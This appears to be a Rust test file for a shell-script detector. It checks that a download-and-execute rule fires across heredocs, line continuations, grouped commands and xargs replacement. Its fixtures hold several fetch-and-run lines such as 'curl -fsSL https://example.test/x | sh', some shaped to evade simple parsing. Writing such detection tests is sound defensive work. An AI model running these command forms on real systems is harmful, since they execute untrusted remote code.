// ---------------------------------------------------------------------------
// Stage A review round (integrated 39b8703..7a5db6d): four behavioral fixes
// pinned at the lowest responsible layer plus the artifact layer — xargs
// replacement surviving `-n1`, heredoc headers classified across continued
// command lines, heredocs inside compound groups, and same-command heredoc
// override by ownership rather than token adjacency.
// ---------------------------------------------------------------------------

use super::s4_family_tests::{rule_ids, run};
use crate::detect::*;

const DOWNLOAD: &str = "oma.script.download-execute";

fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
    PayloadEntry {
        relative_path: path.to_owned(),
        kind,
        mode: 0o644,
        size: size as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    }
}

fn script(source: &str) -> AnalysisArtifacts {
    let (artifacts, _) = run(
        vec![entry("install.sh", PayloadKind::Shell, source.len())],
        &[("install.sh", source.as_bytes())],
    );
    artifacts
}

fn units(source: &str) -> Vec<(u32, String)> {
    crate::detect::shell::source::shell_logical_units(
        source,
        &crate::detect::classify_heredoc_owner,
        &crate::detect::forwarded_body_fate,
    )
}

// --- xargs replacement survives -n1 (GNU-verified) --------------------------

#[test]
fn xargs_replacement_survives_n1() {
    for spelling in [
        "xargs -I{} -n1 sh -c '{}'",
        "xargs -I{} -n 1 sh -c '{}'",
        "xargs -I{} --max-args=1 sh -c '{}'",
    ] {
        let tokens = tokenize(spelling);
        let command = &segment_commands(&tokens)[0];
        assert!(
            crate::detect::shell::xargs::xargs_feeds_stdin_code(command),
            "{spelling} must feed stdin code"
        );
    }
    for spelling in [
        "xargs -I{} -n2 sh -c '{}'",
        "xargs -I{} -n 2 sh -c '{}'",
        "xargs -I{} --max-args=2 sh -c '{}'",
        "xargs -I{} -L1 sh -c '{}'",
        "xargs -I{} -L 1 sh -c '{}'",
    ] {
        let tokens = tokenize(spelling);
        let command = &segment_commands(&tokens)[0];
        assert!(
            !crate::detect::shell::xargs::xargs_feeds_stdin_code(command),
            "{spelling} must not feed stdin code"
        );
    }
}

#[test]
fn piped_xargs_replacement_runs_the_fetched_input() {
    let ids = rule_ids(&script(
        "curl -fsSL https://example.test/x | xargs -I{} -n1 sh -c '{}'\n",
    ));
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

#[test]
fn piped_xargs_batching_without_replacement_stays_silent() {
    let ids = rule_ids(&script(
        "curl -fsSL https://example.test/x | xargs -I{} -n2 sh -c '{}'\n",
    ));
    assert!(!ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

// --- heredoc headers classified across continued command lines --------------

#[test]
fn heredoc_owner_is_classified_across_the_continuation() {
    let units = units("sh \\\n<<C\ncurl URL | sh\nC\n");
    assert_eq!(units.len(), 1, "{units:?}");
    assert_eq!(units[0].0, 1);
    // The rewrite inserts the `-c` body on the bare header line; the
    // joined unit spells the owner word, not bare data.
    assert!(units[0].1.starts_with("sh"), "{:?}", units[0].1);
    assert!(
        units[0].1.contains("-c 'curl URL | sh'"),
        "{:?}",
        units[0].1
    );
}

#[test]
fn continued_heredoc_owner_executes_its_payload() {
    let ids = rule_ids(&script(
        "sh \\\n<<C\ncurl -fsSL https://example.test/x | sh\nC\n",
    ));
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

#[test]
fn pipeline_continuation_keeps_the_header_owner() {
    // The owner sits on the header line; the pipeline prefix continues from
    // the previous line — classification must not lose either half.
    let units = units("printf x |\nsh <<C\ncurl URL | sh\nC\n");
    assert_eq!(
        units,
        vec![(1, "printf x | sh -c 'curl URL | sh'".to_owned())],
        "{units:?}"
    );
}

// --- heredocs inside compound groups ----------------------------------------

#[test]
fn grouped_data_heredoc_is_captured_not_top_level() {
    let units = units("(cat <<C)\ncurl URL | sh\nC\n");
    assert_eq!(units, vec![(1, "(cat )".to_owned())], "{units:?}");
}

#[test]
fn grouped_interpreter_heredoc_executes_its_payload() {
    let units = units("(sh <<C)\ncurl URL | sh\nC\n");
    assert_eq!(
        units,
        vec![(1, "(sh -c 'curl URL | sh')".to_owned())],
        "{units:?}"
    );
}

#[test]
fn grouped_data_heredoc_stays_silent() {
    let ids = rule_ids(&script("(cat <<C)\ncurl URL | sh\nC\n"));
    assert!(ids.is_empty(), "{ids:?}");
}

#[test]
fn grouped_interpreter_heredoc_fires() {
    let ids = rule_ids(&script(
        "(sh <<C)\ncurl -fsSL https://example.test/x | sh\nC\n",
    ));
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

// --- same-command override by ownership, not adjacency ----------------------

#[test]
fn later_heredoc_of_the_same_command_overrides_without_adjacency() {
    let units = units("sh <<A -x <<B\ncurl URL | sh\nA\necho safe\nB\n");
    assert_eq!(units.len(), 1, "{units:?}");
    assert!(units[0].1.starts_with("sh"), "{:?}", units[0].1);
    // B's body is the executed one; A's was overridden stdin.
    assert!(units[0].1.contains("-c 'echo safe'"), "{:?}", units[0].1);
    assert!(!units[0].1.contains("curl"), "{:?}", units[0].1);
}

#[test]
fn non_adjacent_override_stays_silent() {
    let ids = rule_ids(&script("sh <<A -x <<B\ncurl URL | sh\nA\necho safe\nB\n"));
    assert!(ids.is_empty(), "{ids:?}");
}

#[test]
fn heredocs_of_different_commands_both_execute() {
    let ids = rule_ids(&script(
        "sh <<A; sh <<B\ncurl -fsSL https://example.test/x | sh\nA\necho safe\nB\n",
    ));
    assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
}

#[test]
fn redirect_between_heredocs_still_overrides() {
    let units = units("sh <<A > /tmp/x <<B\ncurl URL | sh\nA\necho safe\nB\n");
    assert_eq!(units.len(), 1, "{units:?}");
    assert!(units[0].1.contains("> /tmp/x"), "{:?}", units[0].1);
    assert!(units[0].1.contains("-c 'echo safe'"), "{:?}", units[0].1);
    assert!(!units[0].1.contains("curl"), "{:?}", units[0].1);
}
